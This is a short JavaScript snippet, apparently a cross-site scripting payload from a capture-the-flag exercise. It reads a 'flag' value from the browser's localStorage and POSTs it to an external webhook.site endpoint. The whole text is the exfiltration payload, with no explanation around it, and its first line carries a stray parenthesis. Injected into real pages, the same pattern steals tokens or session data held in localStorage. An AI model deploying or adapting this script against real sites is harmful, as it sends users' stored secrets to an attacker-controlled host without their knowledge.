let flag = localStorage.getItem("flag"));
let URL = 'https://webhook.site/97274b59-5b47-484b-a6d6-6908d03fad5e';
fetch(URL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ flag })
 });
